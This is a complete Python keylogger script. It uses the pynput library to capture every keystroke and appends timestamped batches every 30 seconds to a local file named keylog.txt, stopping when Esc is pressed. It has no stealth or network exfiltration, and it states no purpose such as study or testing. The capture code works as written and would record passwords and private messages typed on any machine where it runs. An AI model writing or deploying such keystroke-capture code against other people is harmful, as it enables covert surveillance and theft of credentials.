from pynput import keyboard
from datetime import datetime
import os

# Get the directory where the script is located
script_directory = os.path.dirname(os.path.abspath(__file__))

# File to save the logged keystrokes in the same directory as the script
log_file = os.path.join(script_directory, "keylog.txt")

# Interval duration
interval_seconds = 30

# Track the start time of the current interval
start_time = datetime.now()

# Store keystrokes for the current interval
keystrokes = []

# Function to log the keys pressed
def on_press(key):
    global start_time, keystrokes
    
    # Get the current time
    current_time = datetime.now()
    
    # Check if we have reached the end of the interval
    if (current_time - start_time).total_seconds() >= interval_seconds:
        # Write the collected keystrokes to the file with the timestamp
        with open(log_file, "a") as f:
            timestamp = start_time.strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{timestamp} - {''.join(keystrokes)}\n")
        
        # Start a new interval
        start_time = current_time
        keystrokes = []
    
    # Record the current keystroke
    try:
        keystrokes.append(key.char)
    except AttributeError:
        keystrokes.append(f"[{key}]")

# Function to handle when the program stops
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
